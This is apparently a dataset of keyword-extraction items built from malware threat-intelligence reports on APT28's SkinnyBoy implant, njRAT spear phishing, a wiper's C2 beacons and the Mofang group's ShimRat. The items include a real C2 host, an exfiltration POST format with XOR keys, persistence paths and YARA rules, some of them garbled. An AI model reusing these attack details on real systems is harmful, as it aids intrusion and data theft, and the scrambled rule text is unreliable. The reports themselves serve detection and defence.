spear-phishing emails; targets; vulnerabilities; the target; 0-day; access; victims; the implant; SkinnyBoy; persistence; memory; data; victims; the malware; time; capabilities.,[' 1. Spear phishing email delivers first stage dropper 2. Dropper installs launcher and main SkinnyBoy implant 3. Implant exfiltrates system info and retrieves final payload 4. Final payload DLL injected into memory 5. Persistent access and control over victim system '],"Extract the keywords: 05 2021 TLP: WHITEA NOT SO FANCY GAME EXPLORING THE NEW SKINNYBOY BEAR’S BACKDOOR2021 - Cyber Threat Intelligence Researchwww.cluster25.io 02 ADVERSARY OPERATIONAL SECURITY INFECTION CHAIN 01 VECTOR AND FIRST STAGE 02 SKINNYBOY DROPPER 03 SKINNYBOY LAUNCHER 04 SKINNYBOY IMPLANT ATTRIBUTION ATT&CK MATRIX DETECTION RULE SKINNYBOY DROPPER [YARA] SKINNYBOY LAUNCHER [YARA] SKINNYBOY IMPLANT [YARA] IOCS ABOUT THE REPORT3 232| 2021 Cyber Threat Intelligence Research© Cluster25EXECUTIVE SUMMARYThis paper presents an analysis of a new and previously unreported malware internally dubbed as ""SkinnyBoy"".Based on long-term observations and technical evidence, Cluster25 cyber intelligence research team associates this implant, with a medium-high degree of confidence, to the threat actor known as APT 28 / Fancy Bear / Pawn Storm.3| 2021 Cyber Threat Intelligence Research© Cluster25INTRODUCTION01 INTRODUCTIONAPT 28 (aka Pawn Storm, Fancy Bear, Strontium) is a famous hacking group that often grabs the media's attention when suspected of perpetrating cyber intrusions that occurred against high profile public and private institutions.It's categorized as APT (Advanced Persistent Threat) because this adversary pursues a well- defined set of goals against a set of well-defined targets. Presumably operating since the mid-2000s, its techniques, tactics, and procedures are compatible with a state-sponsored threat actor. The group usually targets companies and organizations operating in the military, government, and diplomatic sectors, and security organizations aligned with the NATO objectives.This adversary can adopt different techniques and tactics to obtain initial access to the victim's system. Among these there are certainly:1. Watering hole attacks against compromised websites frequently visited by targets 2. Exploit kit / 0day and common vulnerabilities used to infect targets 3. Social engineering techniques, such as spear-phishing email messages 4. Credential TheftHowever, even though these techniques can sometimes be very evolved, it is not unusual to observe and correlate less sophisticated activities aimed at obtaining a foothold in the targeted perimeter.Indeed, APT28 / Fancy Bear has been observed quite often updating their tools and malware implants. While over time it was possible to notice substantial increases in sophistication even among different samples of the same malware family, other times the level of sophistication was significantly lower than expected.4| 2021 Cyber Threat Intelligence Research© Cluster25INTRODUCTIONConsidering the group's capabilities, the tactic of significantly lowering these levels becomes functional with an attempt to deceive the APT nature of the sample and make any attribution effort more complex.This is the case of the last implant observed by our research team which has a rather low level of sophistication and basic operating logic even if fully operational and functional. This implant, which is still unreported at the time of writing, has been internally called SkinnyBoy and its attribution goes to APT28/Fancy Bear group after months of observations.Before analyzing this sample, we found out it was uploaded on a popular online platform and detected only by Microsft Defender engine as belonging to the ""AceLog"" family.During our analysis, we came to the conclusion that this implant was used to target military and government institutions.5| 2021 Cyber Threat Intelligence Research© Cluster25INTRODUCTION02 ADVERSARY OPERATIONAL SECURITYDuring the analysis of the campaign, the adversary was observed using commercial VPN services as part of their OPsec in order to hide thier tracks. The same VPN services were used to purchase and manage their infrastructure during this campaign, according to the simplified scheme shown below:Fig. 1 - Adversary connectivity schema6| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINComparable with previous APT28 / Fancy Bear attacks, the actor used spear-phishing techniques to deliver multi-staged infection chains with at least two different drop points.7| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAIN01 VECTOR AND FIRST STAGEThe vector of the infection is a spear phishing email delivering a Word Office document with a significant name related to an International Conference. Both the vector and its naming are consistent with APT28 / FancyBear TTPs. As expected, the document triggers a MACRO function able to extract a Microsoft Dynamic Link Library (DLL) which then acts as downloader of a SkinnyBoy dropper (tdp1.exe) from a first dropurl.02 SKINNYBOY DROPPERtpd1.exe is the second stage of the infection. Once downloaded in the victim's file system, it extracts all the components necessary to set persistence and trigger the following malicious operations. The extracted payload is encoded in Base64 format and appended as an overlay in the executable file.Fig. 2 - Overlay of tpd1.exe8| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINAt the time of execution, the malicious process decodes the payload and, starting from it, writes two different files on the filesystem, then deletes itself. The dropped files are:-C:\Users\%username%\AppData\Local\devtmrn.exe encrypted way. The actor used a different XOR key for each string used. Some of these associations are shown in the following table.CLEAR STRINGUSED XOR KEYMicrosoft TerminalServerClient TermSrvClt.dllMV$)fjgkl KV*#4u8K#HdefnNFn4fg IOJ$C#83r#rji2Tab. 1 - Used XOR keysTo stay under the radar, the malware never executes the extracted files. Instead, it creates a persistence mechanism on the infected machine which allows a delayed execution of the next stages.It creates a LNK file under Windows Startup folder (%appdata%\Microsoft\Windows\Start Menu\Programs\Startup), named devtmrn.lnk, which points to the extracted malware devtmrn.exe.The creation of the link file occurs through a Windows COM object instantiated using the CoCreateInstance WinAPI function, passing the CLSID associated to LNK files as argument.9| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINFig. 3 - Part of the routine used to create LNK file(HKEY_CLASSES_ROOT\.lnk\ShellEx\{000214F9-0000-0000-C000-000000000046})03 SKINNYBOY LAUNCHEROnce the machine reboots, the LNK file, placed into system's Startup folder, triggers the execution of the devtmrn.exe executable, which simply acts as a launcher of the main implant.When launched, it only checks the existence of the following pathC:\Users\%username%\AppData\Local\Microsoft\TerminalServerClient\TermSrvClt.dlland starts a new process invoking the first DLL exported function, named RunMod.10| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINTo identify the right DLL to launch, the executable calculates the SHA256 hashes of each filename into C:\Users\%username%\AppData\Local comparing each one of them with the pre-computed SHA256 of the string TermSrvClt.dll, which is:F4 EB 56 52 AF 4B 48 EE 08 FF 9D 44 89 4B D5 66 24 61 2A 15 1D 58 14 F9 6D 97 13 2C 6D 07 6F 86Hashes are calculated through classic WinAPI functions, such as CryptHashData and CryptGetHashParam, as illustrated in the following figure.Fig. 4 - Hash checking routine11| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAIN04 SKINNYBOY IMPLANTThe DLL executable, named TermSrvClt.dll, corresponds to the main implant of the infection chain. It exfiltrates information about the infected system and retrieves and launches the final payload.Once triggered, the process executes two Windows utilities to gather information about the system, systeminfo.exe and tasklist.exe. subsequently, it extracts a list of filenames contained in a subset of interesting directories, which are:- C:\Users\%username%\Desktop - C:\Program Files - C:\Program Files (x86) - C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools - C:\Users\%username%\AppData\Roaming - C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Templates - C:\Windows - C:\Users\user\AppData\Local\TempThe output of this phase is concatenated using a fixed structure, which is then sent to the Command and Control, updaterweb[.]com, using a POST request with the following body schema:12| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINPOST url HTTP/1.1 User-Agent: Opera Host: updaterweb.com Content-Length: 39739 Cache-Control: no-cacheid={MACHINE_NAME}#{USERNAME}#{DISK_VOLUME_SERIAL} &current=1&total=1&data={BASE64_ENCODED_EXTRACTED_INFO}Tab. 2 - First POST requestBefore being encoded in Base64, the previously extracted information is organized according to the following structure:13| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAIND8 1A 00 00 systeminfo output {two random bytes} 00 00 tasklist output {two random bytes} 00 00 ##################C:\Users\user\Desktop\*################## files list ##################C:\Program Files\*################## files list ##################C:\Program Files (x86)\*################## files list ##################C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools\*################## files list ##################C:\Users\user\AppData\Roaming\*################## \Users\user\AppData\Roaming\Microsoft\Windows\Templates\*################## ##################C:\Users\user\AppData\Local\Temp\*################## files listTab. 3 - POST body structure14| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINAfter completing the first HTTPS POST request containing the gathered information, the malware contacts the C2 again in order to retrieve the next payload. The new POST request is structured as follow:POST url HTTP/1.1 User-Agent: Opera Host: updaterweb.com Content-Length: 37 Cache-Control: no-cacheid={MACHINE_NAME}#{USERNAME}#{DISK_VOLUME_SERIAL}&cmd=yTab. 4 - Second POST requestTo avoid static detection, the format strings used to build the POST request body are XORED using two different keys, as seen in the previous stage.CLEAR STRINGUSED XOR KEYid=%s#%s#%u&current=%s&total=%s&data=id=%s#%s#%u&cmd=yqpzoamxiendufbtbf3- #$*40fvnpwOPDwdkvn CEJ&V%$84k839y92mTab. 5 - Other XOR keys15| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINFinally, the Command and Control should reply with the next DLL that will be executed, representing the final stage of the infection, which probably manifests backdoor behaviors.By statically analyzing the TermSrvClt.dll compiled code, we can assume that once the server correctly replies, it stores the downloaded file in %TEMP% folder, self-injecting and executing it in memory using the LoadLibrary and GetProcAddress WinAPIs. The downloaded file is then deleted to covert the infection tracks.Fig. 5 - Part of DLL loading16| 2021 Cyber Threat Intelligence Research© Cluster25ATTRIBUTIONAfter a period of observation of the described threat and an in-depth analysis of the identified victimology, Cluster25 team attributes the SkinnyBoy implant and the related attack to Russian Group known as APT28 / FancyBear with a mid- to-high confidence.17| 2021 Cyber Threat Intelligence Research© Cluster25ATT&CK MATRIXTACTICTECHNIQUENAMEExecutionPersistenceT1059T1204T1547Command and Scripting InterpreterUser ExecutionBoot or Logon Initialization ScriptsDefense EvasionT1140Deobfuscate/Decode Files or InformationDiscoveryCollectionCommand and ControlExfiltrationT1057T1082T1083T1005T1119T1071T1132T1020T1041Process DiscoverySystem Information DiscoveryFile and Directory DiscoveryData From Local SystemAutomated CollectionApplication Layer ProtocolData EncodingAutomated ExfiltrationExfiltration over C2 Channel18| 2021 Cyber Threat Intelligence Research© Cluster25DETECTION RULESkinnyBoy Dropper [YARA]rule APT28_SkinnyBoy_Dropper: RUSSIAN THREAT ACTOR { (uint16(0) == 0x5A4D and all of them) condition:author = ""Cluster25"" $ = ""cmd /c DEL "" ascii $ = "" \"""" ascii $ = {8a 08 40 84 c9 75 f9} $ = {0f b7 84 0d fc fe ff ff 66 31 84 0d fc fd ff ff}19| 2021 Cyber Threat Intelligence Research© Cluster25DETECTION RULESkinnyBoy Launcher [YARA]meta: strings:rule APT28_SkinnyBoy_Launcher: RUSSIAN THREAT ACTOR { 13 2C 6D 07 6F 86} 56 ?? ?? ?? ?? 50 FF ?? ?? ?? FF 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ??} }condition:author = ""Cluster25"" $l2 = ""CryptCreateHash"" ascii $l3 = ""FindNextFile"" ascii $l4 = ""PathAddBackslashW"" ascii $l5 = ""PathRemoveFileSpecW"" ascii $h1 = {50 6A 00 6A 00 68 0C 80 00 00 FF ?? ?? ?? FF 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 6A 00$h2 = {8B 01 3B 02 75 10 83 C1 04 83 C2 04 83 EE 04 73 EF}uint16(0) == 0x5a4d and filesize < 100KB and ($sha or (all of ($l*) and all of ($h*)))20| 2021 Cyber Threat Intelligence Research© Cluster25DETECTION RULESkinnyBoy Implant [YARA]meta: strings:import ""pe"" rule APT28_SkinnyBoy_Implanter: RUSSIAN THREAT ACTOR { 85 [4] 6A ?? 50 66 [7] E8} }condition:author= ""Cluster25"" date= ""2021-05-24"" contained are not subject to restrictions on sharing in its original form.23| 2021 Cyber Threat Intelligence Research© Cluster25Cluster25 is a cybersecurity research division. Its experts are specialized in hunting and collecting cyber threats, analysis and reverse-engineering processes. Cluster25’s members internally develop technologies and capabilities for attribution practices, classification and categorization of malicious artifacts, often before being used in operations.Visit us at cluster25.io©2021 Cluster25. All rights reserved. All materials are intended for the original recipient only. The reproduction and distribution of this material is prohibited without express written permission from Cluster25. Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation. The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action. As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report. The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion2021 - Cyber Threat Intelligence Research© Cluster25 ","{'phrases': ['Spear phishing email', 'DEL', 'FIRST', 'Dropper', 'launcher', 'SKINNYBOY IMPLANT', 'retrieves', 'final payload', 'DLL', 'memory', 'control'], 'target': 'Spear phishing email; DEL; FIRST; Dropper; launcher; SKINNYBOY IMPLANT; retrieves; final payload; DLL; memory; control.'}"
the attackers; spear; phishing emails; Malware; the victim; the emails; malicious word document; the document; the victim; the macro; the malware; a dropper; a malware; the infected system; control; the infection.,"[' 1. Victims receive a spear phishing email containing a malicious Word document as an attachment. 2. If the victim enables macros in the Word document, obfuscated malicious macro code is triggered. 3. The macro code decodes strings containing a Pastebin URL and a PowerShell script. 4. The PowerShell script downloads base64 encoded content from the Pastebin URL. 5. The base64 content is decoded into an executable malware file and dropped on the system. 6. The dropped executable malware (njRAT) is executed via the PowerShell script. 7. njRAT connects to a command and control server, sends system info, and allows the attacker to control the infected system. ']","Extract the keywords: 2/28/2017Uri Terror attack & Kashmir Protest Themed spear phishing emails targeting Indian Embassies and Indian Ministry of external affairs - CysinfoURI TERROR ATTACK & KASHMIR PROTEST THEMED SPEAR PHISHING EMAILS TARGETING INDIAN EMBASSIES AND INDIAN MINISTRY OF EXTERNAL AFFAIRS1 MONTH AGO • ARTICLES •22In my previous blog I posted details of a cyber attack targeting Indian government organizations. This blog post describes anotherattack campaign where attackers used the Uri terror attack and Kashmir protest themed spear phishing emails to target o cials inthe Indian Embassies and Indian Ministry of External A airs (MEA). In order to infect the victims, the attackers distributed spear-phishing emails containing malicious word document which dropped a malware capable of spying on infected systems. The emailpurported to have been sent from legitimate email ids. The attackers spoofed the email ids associated with Indian Ministry of HomeA airs to send out email to the victims. Attackers also used the name of the top-ranking o cial associated with Minister of Homea airs in the signature of the email, this is to make it look like the email was sent by a high-ranking Government o cial associatedwith Ministry of Home A airs (MHA).Overview of the Malicious EmailsIn the The  rst wave of attack, The attackers spoofed an email id that is associated with Indian Ministry of Home A airs (MHA) andan email was sent on September 20th, 2016 (just 2 days after the Uri terror attack) to an email id associated with the Indian Embassyin Japan. The email was made to look like as if an investigation report related to Uri terror attack was shared by the MHA o cial. Thisemail contained a malicious word document (Uri Terror Report.doc) as shown in the below screen shotOn Sept 20th,2016 similar Uri Terror report themed email was also sent to an email id connected with Indian embassy in Thailand.This email was later forwarded on Oct 24th,2016 from a spoofed email id which is associated with Thailand Indian embassy tovarious email recipients connected to the Indian Ministry of External A airs as shown in the below screen shot. This email alsocontained the same malicious word document (Uri Terror Report.doc)In the second wave of attack slightly di erent theme was used, this time attackers used the Jammnu & Kashmir protest theme totarget the victims. In this case Attackers again spoofed an email id associated with Indian Ministry of Home A airs and the mail wassent on September 1,2016 to an email id associated Thailand Indian embassy, this email was later forwarded on Oct 24th,2016 froma spoofed email of Thailand Indian embassy to various email recipients connected to the Indian Ministry of External A airs (MEA).This time the email was made to look like an investigation report related to Jammu & Kashmir protest was shared by the Ministry ofHome A airs O cial and the forwarded email was made to look like the report was forwarded by an Ambassador in Thailand Indianembassy to the MEA o cials. This email contained a di erent malicious word document (mha-report.doc) as shown in the belowscreen shot.url Terror attack & Kashmir Protest Themed spear phishing emails targeting Indian Embassies and Indian Ministry of external affairs - CysinfoFrom the emails (and the attachments) it looks like the goal of the attackers was to infect and take control of the systems and also to spy on the actions of the Indian Government post the Jammu & Kashmir protest and Uri Terror attack.Analysis of Malicious Word DocumentsWhen the victim opens the attached word document it prompts the user to enable macro content and both the documents (UriTerror Report.doc and mha-report.doc) displayed the same content and contained a Show Document button as shown belowIn case of both the documents (Uri Terror Report.doc and mha-report.doc) the malicious macro code was heavily obfuscated(usedobscure variable/function names to make analysis harder) and did not contain any auto execute functions . Malicious activity istrigged only on user interaction, attackers normally use this technique to bypass sandbox/automated analysis. Reverse engineeringboth the word documents (Uri Terror Report.doc & mha-report.doc) exhibited similar behaviour except the minor di erencementioned below.In case of mha-report.doc the malicious activity triggered only when the show document button was clicked, when this event occursthe macro code calls a subroutine CommandButton1_Click() which in turn calls a malicious obfuscated function (Bulbaknopka()) asshown in the below screen shot.In case of Uri Terror Report.doc the malicious activity triggered when the document was either closed or when the show documentbutton was clicked, when any of these event occurs a malicious obfuscated function (chugnnarabashkoim()) gets called as shownbelow.The malicious macro code  rst decodes a string which contains a reference to the pastebin url. The macro then decodes aPowerShell script which downloads base64 encoded content from the pastebin url.Below screen shot shows the network tra c generated as a result of macro code executing the PowerShell script.Below screen shot shows the malicious base64 encoded content hosted on that pastebin link.The base64 encoded content downloaded from the Pastebin link is then decoded to an executable and dropped on the system. Thetechnique of hosting malicious code in legitimate sites like Pastebin has advantages and it is highly unlikely to trigger any suspicionin security monitoring and also can bypass reputation based devices. Below screen shot shows the  le (o ceupdate.exe) decodedand dropped on the system.The dropped  le was determined as modi ed version of njRAT trojan. The dropped  le (o ceupdate.exe) is then executed by themacro code using the PowerShell script.njRAT is a Remote Access Tool (RAT) used mostly by the actor groups in the middle east. Once infected njRAT communicates to theattacker and allows the attacker to log keystrokes, upload/download  les, access victims web camera, audio recording, stealcredentials, view victims desktop, open reverse shell etc. The njRAT attacker control panel and the features in the attacker controlpanel is shown in the below screen shot.Analysis of the Dropped Executable (o ceupdate.exe)The dropped  le was analyzed in an isolated environment (without actually allowing it to connect to the c2 server). This sectioncontains the behavioral analysis of the dropped executableurl Terror attack & Kashmir Protest Themed spear phishing emails targeting Indian Embassies and Indian Ministry of external affairs - CysinfoOnce the dropped  le (o ceupdate.exe) is executed the malware drops additional  les (googleupdate.exe, malib.dll and msccvs.dll) ","{'phrases': ['Victims', 'email', 'a malicious Word document', 'the victim', 'the Word document', 'The macro code', 'the PowerShell script', 'content', 'the Pastebin URL', 'The base64', 'the system', 'the Dropped Executable', 'njRAT', 'control', 'the attacker'], 'target': 'Victims; email; a malicious Word document; the victim; the Word document; The macro code; the PowerShell script; content; the Pastebin URL; The base64; the system; the Dropped Executable; njRAT; control; the attacker.'}"
wiper malware; Windows; a decoy VM; the wiper component; initial access; memory; the payload; 0xFFFFFFFF; data; the collected data; the wiper module; commands; data; the C2 servers; PE; the incident; a debugger; the presence; compromise.,"["" 1. The wiper malware contains IP addresses of command and control (C2) servers hardcoded in the files. 2. The malware sends beacons containing the infected host's IP address and hostname to the C2 servers. 3. The beacon payload is constructed by allocating a buffer that is too large, resulting in extra data from the stack being included. 4. The malware overwrites systems by wiping data to render it inaccessible. 5. The wiping can cover up other malicious activity and make investigation difficult. ""]","Extract the keywords: Wiper Malware – A Detection Deep DiveThis post was authored by Christopher Marczewski with contributions from Craig WIlliamsA new piece of wiper malware has received quite a bit of media attention. Despite all the recent press, Cisco’s Talos team has historic examples of this type of malware going back to the 1990s. Data is the new target, this should not surprise anyone. Recent examples of malware effectively “destroying” data -- putting it out of victims’ reach – also include Cryptowall, and Cryptolocker, common ransomware variants delivered by exploit kits and other means.Wiping systems is also an effective way to cover up malicious activity and make incident response more difficult, such as in the case of the DarkSeoul malware in 2013.Any company that introduced proper back-up plans in response to recent ransomware like Cryptolocker or Cryptowall should already be protected to a degree against these threats. Mitigation strategies like defense in depth will also help minimize the chance of this malware reaching end systems.The Deep DiveInitially we started investigating a sample reported to be associated with the incident to improve detection efficacy. Based off our analysis of sample. By the time we reached the network-related functions during our analysis, the relevant IP addresses belonging to the C2 servers were no longer responding back as expected. In order to capture the necessary traffic we had to modify both of the aforementioned disk wiper components. One modification replaced one of the hard-coded C2 server IP addresses with a local address belonging to a decoy VM while changing references to the other hard-coded addresses to point to this local address instead. The other modification simply changed the parameter being passed to an instance of the Sleep() function so debugging efforts wouldn’t be put on hold for 45 minutes (the original sample used a 10 minutes sleep).When we initially examined a rule that was being distributed in the public we were looking for areas where we could improve coverage to better protect our customers. The new Wiper variant is poorly written code and luckily includes very little obfuscation.The author(s) made the mistake of allocating a buffer for the send() function that surpasses the data they wished to include in the payload: a null-terminated opening parentheses byte, the infected host’s local IP address, and the first 15 bytes of the host name. This incorrect buffer allocation results in the desired data, in addition to some miscellaneous data already present on the stack (including the 0xFFFFFFFF bytes we alerted on in the first revision of our rule).Simply running the disk wiper component on different versions of Windows proves the miscellaneous data from the stack that we onced alerted on only applies to beacons being sent from Win XP hosts:Beacon payload from infected WinXP x86 VM:Beacon payload from infected Win7 x64 VM:We have tested part of this hypothesis by running the malware on the same VMs when they had maximum length host names. The resulting beacons continued to limit the hostname bytes in the payload to 15 bytes. To confirm the entire hypothesis, we had to debug and step carefully through the instructions responsible for the data in these beacon payloads. You start by running the disk wiper component alone with the -w flag (which will naturally occur at some point when the disk wiper component is executed and copies itself to host three times). When you hit the following instruction……we have to force execution of the alternate jump condition using the debugger to get to the next interesting chunk of assembly:We eventually arrive to our function call in the code block following the ZF toggle. It’s responsible for setting up the necessary socket and sending the beacon payload once a connection has been established:Later on, we reach a call within the current function (sub_402D10) that is purely responsible for sending the constructed payload:When we arrive at the following instruction…The code is just about to move 10 double words (ECX is currently 0x0A) from ESI (currently assigned to 0x415D60, which was on the stack prior to calling sub_402C80) to the stack itself (starting at EDI, currently assigned stack pointer 0x12F4CE).Finally, we reach the call to the Windows function send():Now, at this point you’re probably thinking, “Cool. You explained how the payload is ultimately sent out, but how does this explain the random bytes in the payload?”. Glad you asked…Shortly after the instruction where you had to manually toggle the ZF but prior to sub_402D10, there’s a call to a function that fetches the name of the infected host:The first block of instructions belonging to this function is shown below:When you get to the following instruction in that block……ECX = 0x08, ESI = 0x14F8D4, & EDI = 0x415D64. This means that eight double words will be extracted starting at the pointer in ESI and moved to the pointer in EDI. Guess what’s on the stack right now?:The data from these eight stack frames will get moved to the .data section, starting at 0x415D64. You’ll get the four “prefix bytes” added on once the local IP address is acquired from that same code block via:And, as we’ve already detailed earlier, 0x2800 will be added as final prefix bytes to the resulting payload. But, we now have another hard-coded element we can alert on in the beacon payload:The third instruction shown above will store 0x04 as a doubleword to 0x415D84, which just happens to be at the very end of the payload currently stored in the .data section.With this information, we were able to revise accordingly and design the following rule:Click for a text version. It is important to note that sid 32674 will continue to be improved in the future as the malware evolves. This blog applies to the variants we are aware of as of revision 2 of the signature.This rule will alert on the samples we’ve analyzed thus far that send these beacons back to their respective C2 servers. What’s more, the rule alerts on all of the hard-coded portions of the payload, providing more complete coverage regardless of the major Windows version running on these infected hosts.ConclusionWe always want to deliver up-to-date detection for the latest threats in the quickest most efficient manner possible. However, the quality of the detection should never be dismissed. The suggested rule we initially landed upon did cover these wiper components when run under select Windows environments, but our team wanted to fully understand the reasoning and justification behind every option of that rule. This helps us ensure we cover the threat to the best extent possible and do so in the most efficient way possible. Once we did we were able to analyze further and release coverage that was more robust for our customers to help prevent further compromises of this magnitude that may just utilize the Wiper malware family.CoverageAdvanced Malware Protection (AMP) is well suited to detect and block this type of attack.CWS or WSA web scanning will prevent access to malicious websites and detect the malware used in this attack.The Network Security protection of IPS and NGFW have up-to-date signatures and will block this threat.ESA is not applicable for this attack because this threat is not using email.Tags: APT, malware, security, Talos ","{'phrases': ['The wiper malware', 'IP addresses', 'the malware', 'beacons', 'the infected host', 'the C2 servers', 'the beacon payload', 'a buffer', 'Data', 'the stack', 'systems', 'access', 'malicious activity'], 'target': 'The wiper malware; IP addresses; the malware; beacons; the infected host; the C2 servers; the beacon payload; a buffer; Data; the stack; systems; access; malicious activity.'}"
Initial reconnaissance; targets; interest; reconnaissance; vulnerabilities; use; the group; tools; ShimRat; command; control; persistence; Mimikatz; lateral movement; tools; Mimikatz; remote access; data; compromise; attacks.,"[""1. Perform initial compromise of targets via socially engineered emails containing ShimRatReporter malware. 2. ShimRatReporter gathers system info and sends it to a C2 server to map the victim's environment. 3. Mofang sets up infrastructure mimicking the target network or software. 4. A main compromise is conducted by sending emails with a Sharon malware variant containing custom reconnaissance details and communicating with the imposter infrastructure. 5. ShimRat carries out goals like stealing files, logging keystrokes, and screenshotting through its C2 channels. 6. Collected data is exfiltrated from the victim network back to Mofang's servers. 7. New waves of attacks with updated malware are conducted as needed to pursue Mofang's espionage objectives. ""]","Extract the keywords: Lead Author: Yonathan Klijnsma Co-authors:Danny Heppener, Mitchel Sahertian, Krijn de Mik, Maarten van Dantzig, Yun Zheng Hu, Lennart Haagsma, Martin van Hensbergen, Erik de JongMofang A politically motivated information stealing adversaryVersion 1.0 May 17, 2016Executive SummaryMofang (, Mófa ̌ng, to imitate) is a threat actor that almost certainly operates out of China and is probably government-affiliated.It is highly likely that Mofang’s targets are selected based on involvement with invest- ments, or technological advances that could be perceived as a threat to the Chinese sphere of influence. This is most clearly the case in a campaign focusing on government and critical infrastructure of Myanmar that is described in this report. Chances are about even, though, that Mofang is a relevant threat actor to any organization that invests in Myanmar or is otherwise politically involved.In addition to the campaign in Myanmar, Mofang has been observed to attack targets across multiple sectors (government, military, critical infrastructure and the automo- tive and weapon industries) in multiple countries. The following countries have, in the above named sectors, been affected, although fox-it suspects there to be more: India, Germany, United States, Canada, Singapore, South Korea.Despite its diverse set of targets Mofang is probably one group. This is based on the fact that its tools (ShimRat and ShimRatReporter) are not widely used, and that campaigns are not usually observed in parallel.Technically, the group uses distinct tools that date back to at least February 2012: ShimRat and ShimRatReporter. The mofang group does not use exploits to infect targets, they rely on social engineering and their attacks are carried out in three stages: 1 Compromise for reconnaissance, aiming to extract key information about the targetinfrastructure.2 Faux infrastructure setup, designed to avoid attracting attention. 3 The main compromise, to carry out actions on the objective.The name ShimRat is based on how its persistence is build up. It uses the so-called shims in Windows to become persistent. Shims are simply hot patching processes on the fly, to ensure backward compatibility of software on the Microsoft Windows platform.2 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016As far as known, the Mofang group has never used exploits to infect targets, instead relying heavily on social engineering in order to successfully infect targets. The only exploits the group uses are privilege elevation exploits built into their own malware. The vulnerabilities that were being exploited were already known about at the time of use.The full report contains contextual as well as technical information about the group and its activities. These can be used, for example, for threat assessments, compromise assessments, incident response and forensics activities. Should you have any additional information or questions about this group or its activities, please get in touch with fox-it through info@fox-it.com.fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 3Table of ContentsExecutive Summary1Introduction23Who is Mofang and who do they attack? 2.1 About the Mofang group 2.2 Mofang’s targets: a diverse set of entitiesThe distinct modus operandi of Mofang 3.1 Stage 1: Initial reconnoitering compromise 3.2 Stage 2: Faux infrastructure setup 3.3 Stage 3: The main compromise4 A history of past attacks5 Campaigns in Myanmar5.1 Activities related to the Kyaukphyu Special Economic Zone 5.2 Earlier campaigns in Myanmar6Other notable campaigns and attacks 6.1 Attack on Indian defense expo exhibitors 6.2 Attack on ‘seg’ 6.3 Attack using a Citrix lure 6.4 The global campaign7 Preferred tools7.1 ShimRat 7.2 ShimRatReporter8 Network based detection (IOCs)8.1 Snort signatures 8.2 Domains & IP addresses9 Host based detection (IOCs)9.1 yara rules 9.2 ShimRat samples 9.3 ShimRatReporter samples 9.4 Antivirus hijacking components 9.5 Observed services 9.6 Observed shims256 514 | fox-it | Mofang | A politically motivated information stealing adversary | May 20161 IntroductionImitation, in this case imitation of a target’s infrastructure, is a defining feature of their modus operandi.This threat report gives insight into some of the information that fox-it has about a threat actor that it follows, called Mofang. The name Mofang is based on the Mandarin verb  (Mófa ̌ng), which means to imitate. Imitation, in this case imitation of a target’s infrastructure, is a defining feature of their modus operandi.It is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated. Among others, one of their focus areas is the government and critical infrastructure sector of Myanmar. Additional information was used to contextualize and explain the observed attacks and campaigns, since there is obviously no easy insight in their actual agenda and goals. The additional research into geopolitical and economic factors resulted in the hypotheses about the ‘why’ of these campaigns. The full picture, however, will probably remain unknown.fox-it has chosen to release this report now, for additional context to the changing political landscape in Myanmar. This report contains contextual as well as technical information about the group and its activities. These can be used, for example, for threat assessments, compromise assessments, incident response and forensics activities. Should you have any additional information or questions about this group or its activities, please get in touch with fox-it through info@fox-it.com.Chapter 2 through 6 deals with Mofang, the group, its targets and some of their most notable campaigns and attacks. These chapters also contain geopolitical and economic context. Chapter 7 explains the working of Mofang’s preferred tools: ShimRat and SimRatReporter. The final two chapters of this report, chapter 8 and 9, provide technical Indicators of Compromise for use in detecting and hunting, both at a host and at a network level.fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 52 Who is Mofangand who do they attack?2.1 About the Mofang group Despite its diverse set of targets (described in paragraph 2.2), Mofang is probably one group. This is based on the fact that its tools (ShimRat and ShimRatReporter) are not widely used, and that campaigns are not usually observed in parallel.Based on a numbers of factors that will be explained in more detail in this Chapter, it is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated.The most compelling evidence that supports this hypothesis is the fact that the targets and campaigns known so far can be persuasively correlated to important geopolitical events and investment opportunities that align with Chinese interests. The most notable of these will be described in chapter 5, which describes systematic espionage in the government and critical infrastructure sector of Myanmar. It describes: • Companies that are involved with investment possibilities that also involveChinese state owned organizations, become targets;• Government agencies or companies that play a role in deciding about Chineseinvestments, become targets;In addition to the above, there are four notable technical facts. Details such as these can, of course, be changed and manipulated without material impact to attacks, which makes them weaker indicators of attribution than contextual evidence derived from likely campaign goals. In this case, the technical facts support the hypothesis for attribution.Based on a numbers of factors that will be explained in more detail in this Chapter, it is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated.6 | fox-it | Mofang | A politically motivated information stealing adversary | May 20161 There are many similarities at the code level between the stager used by Mofang and others stagers attributed to Chinese groups. Also striking is the method of hijacking Antivirus Products to run the malware, which fox-it calls ShimRat, as described in chapter chapter 7.1. This has been seen in multiple espionage cam- paigns attributed to Chinese groups. In fact the similarities are so strong that some investigators have mistaken ShimRat to be another widely known piece of malware: PlugX. Based on in-depth investigation of both, fox-it has come to the conclusion that they are not the same. ShimRat is probably t is used by a separate group.2 All the documents that were used for the initial attacks contain meta- data that suggests they were 